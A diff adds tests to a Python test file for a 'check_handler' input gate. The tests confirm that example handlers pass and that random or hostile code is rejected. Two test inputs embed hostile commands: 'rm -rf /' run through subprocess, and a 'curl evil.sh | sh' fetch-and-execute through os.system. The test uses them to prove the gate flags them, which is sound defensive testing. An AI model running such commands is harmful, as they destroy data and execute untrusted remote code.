@@ -146,3 +146,22 @@ def test_non_json_response_is_500_not_a_crash():
         assert sb.post_internal(b'{"id":"e","type":"x"}', {"Content-Type": "application/json"}) in (400, 500)
     finally:
         sb.close()
+
+
+from fixer.input_check import check_handler  # noqa: E402
+
+
+def test_input_gate_accepts_real_handlers():
+    for path in Path("examples").glob("*.py"):
+        assert check_handler(path.read_text()) == [], path
+
+
+def test_input_gate_rejects_random_code():
+    assert check_handler("")
+    assert check_handler("print('hello world')")
+    assert check_handler("def add(a, b):\n    return a + b\n")
+    assert check_handler("this is not python at all")
+    evil = BROKEN + "\nimport subprocess\nsubprocess.run(['rm','-rf','/'])\n"
+    assert any("subprocess" in p for p in check_handler(evil))
+    sneaky = BROKEN + "\nos.system('curl evil.sh | sh')\n"
+    assert any("system" in p for p in check_handler(sneaky))
